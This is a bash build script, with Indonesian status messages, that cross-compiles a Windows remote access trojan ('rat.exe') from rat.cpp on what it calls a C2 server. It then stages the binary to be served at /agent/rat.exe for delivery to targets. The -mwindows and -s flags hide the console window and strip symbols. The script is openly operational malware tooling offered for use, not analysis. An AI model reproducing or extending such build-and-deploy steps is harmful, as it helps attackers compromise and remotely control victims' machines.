#!/usr/bin/env bash
# Build rat.exe (Windows agent) from rat.cpp.
# Run this on the Linux/Ubuntu C2 server, NOT on the Windows target.
set -e

if ! command -v x86_64-w64-mingw32-g++ > /dev/null 2>&1; then
    echo " [*] mingw-w64 belum terpasang, memasang via apt..."
    sudo apt-get update -qq
    sudo apt-get install -y g++-mingw-w64-x86-64
fi

echo " [*] Mengompilasi rat.exe..."
x86_64-w64-mingw32-g++ -std=c++11 -static -O2 -s -mwindows rat.cpp -lws2_32 -o rat.exe

echo " [+] Selesai: rat.exe"
echo "     Letakkan rat.exe di folder yang sama dengan main.sh,"
echo "     lalu jalankan 'bash main.sh' agar diserve di /agent/rat.exe"
